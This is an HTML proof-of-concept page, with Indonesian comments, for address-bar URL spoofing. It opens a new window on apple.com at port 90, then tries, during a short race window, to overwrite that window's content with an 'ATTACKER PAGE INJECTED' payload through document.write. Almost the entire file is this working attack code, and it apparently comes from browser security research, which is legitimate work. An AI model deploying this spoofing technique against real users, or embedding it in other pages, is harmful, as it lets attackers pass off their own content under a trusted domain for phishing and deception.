<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes" />
    <title>Direct URL Spoofing PoC</title>
    <style>
      body, html {
        margin: 0;
        padding: 0;
        height: 100%;
        background: #0b0e14;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        color: #f0f6fc;
        display: flex;
        align-items: center;
        justify-content: center;
      }
      .container { text-align: center; max-width: 650px; padding: 20px; box-sizing: border-box; }
      button {
        width: 100%;
        max-width: 360px;
        padding: 18px 24px;
        font-size: 16px;
        font-weight: 600;
        background: #da3633;
        color: #fff;
        border: none;
        border-radius: 10px;
        cursor: pointer;
        box-shadow: 0 4px 14px rgba(218, 54, 51, 0.4);
        transition: transform 0.1s, background 0.2s;
      }
      button:active { background: #b62324; transform: scale(0.98); }
      .info {
        margin-top: 20px;
        font-size: 13px;
        color: #8b949e;
        font-family: monospace;
        word-break: break-all;
        padding: 0 10px;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <button id="execBtn">INITIALIZE DIRECT SPOOF TEST</button>
      <div class="info" id="statusInfo">Status: Ready for interaction.</div>
    </div>

    <script>
      let execButton = document.getElementById("execBtn");
      let statusInfo = document.getElementById("statusInfo");

      execButton.onclick = function () {
        statusInfo.innerText = "Status: Initializing direct URL dispatch...";
        this.style.display = "none";

        try {
          // Membuka jendela baru langsung dengan target URL (misalnya apple.com:90)
          // untuk memaksa bilah alamat segera mencoba memuat URL tersebut tanpa tertahan di about:blank
          let targetWindow = window.open("https://apple.com:90", "_blank");

          if (!targetWindow) {
            statusInfo.innerText = "Status: Execution halted - Pop-up blocked by browser policy.";
            execButton.style.display = "block";
            return;
          }

          statusInfo.innerText = "Status: Target URL dispatched to address bar.";

          // Mencoba menyuntikkan dokumen jika celah waktu (race window) mengizinkan sebelum koneksi port 90 gagal
          setTimeout(() => {
            try {
              let attackerPayload = `
                <!DOCTYPE html>
                <html>
                <head>
                  <meta name="viewport" content="width=device-width, initial-scale=1.0">
                  <title>Attacker Page</title>
                  <style>
                    body {
                      margin: 0; background: #000000; color: #00ff00;
                      font-family: monospace; display: flex; align-items: center; 
                      justify-content: center; height: 100vh; text-align: center;
                    }
                    h1 { font-size: 32px; color: #ff0000; }
                  </style>
                </head>
                <body>
                  <div>
                    <h1>ATTACKER PAGE INJECTED</h1>
                    <p>Forced Over Port 90 State</p>
                  </div>
                </body>
                </html>
              `;
              
              // Mencoba menulis ke dokumen target (akan dibatasi SOP jika navigasi lintas domain berhasil, 
              // tetapi diuji untuk melihat perilaku penanganan bilah alamat)
              targetWindow.document.open();
              targetWindow.document.write(attackerPayload);
              targetWindow.document.close();
            } catch (innerErr) {
              console.debug("Cross-origin injection restricted by browser policy:", innerErr.message);
            }
          }, 300);

        } catch (err) {
          statusInfo.innerText = "Status: Execution error: " + err.message;
        }
      };
    </script>
  </body>
</html>
